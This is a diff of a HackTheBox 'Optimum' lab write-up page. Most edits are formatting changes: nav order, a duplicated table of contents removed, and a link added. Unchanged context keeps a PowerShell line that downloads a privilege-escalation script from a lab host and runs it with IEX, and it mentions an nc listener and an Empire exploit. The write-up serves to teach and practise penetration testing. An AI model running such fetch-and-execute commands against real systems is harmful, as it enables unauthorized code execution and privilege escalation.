@@ -2,7 +2,7 @@
 layout: default
 title: Optimum
 parent: HackTheBox
-nav_order: 7
+nav_order: 5
 ---
 # Navigation Structure
 {: .no_toc }
@@ -10,28 +10,7 @@ nav_order: 7
 ## Table of contents
 {: .no_toc .text-delta }
 
-![](pictures/logo-optimum.png)
-
-- Summary
-- Recon
-- Exploitation
-- Privilege Escalation
-{:toc}
-
-## [](#header-2)Summary:
-
-- Enumerate Vulnerable version of file server
-- Exploit vulnerability to pop powershell...shell
-- Escalate privileges with MS01632
-
-
-# Navigation Structure
-{: .no_toc }
-
-## Table of contents
-{: .no_toc .text-delta }
-
-![](pictures/logo-optimum.png)
+![](pictures/logo-optimum.PNG)
 
 - Summary
 - Recon
@@ -74,6 +53,9 @@ Then after running the exploit and setting up our nc listener/ local python serv
 ![](pictures/cm-optimum.png)
 
 Annnnd we get some access
+
+
+
 ![](pictures/user-optimum.png)
 
 
@@ -85,7 +67,7 @@ Going through the motions with privesc for a Windows box, I start out with a sim
 ![](pictures/systeminfo-optimum.png)
 
 
-From here in order to automate the privesc search process I downloaded from my local python server, Sherlock written by RastaMouse
+From here in order to automate the privesc search process I downloaded from my local python server, [Sherlock](https://github.com/rasta-mouse/Sherlock), written by RastaMouse.
 ```powershell
 PS C:\Users\kostas\Desktop> IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.28/Sherlock/Sherlock.ps1')
 ```
@@ -105,4 +87,4 @@ I used powershell empire's MS01632 exploit to automate this process and was able
 
 
 
-This lab was a good walk through to learn certain privilege escalation techniques/methodologies within Windows.
+Overall, I found the privesc portion of this box very useful!
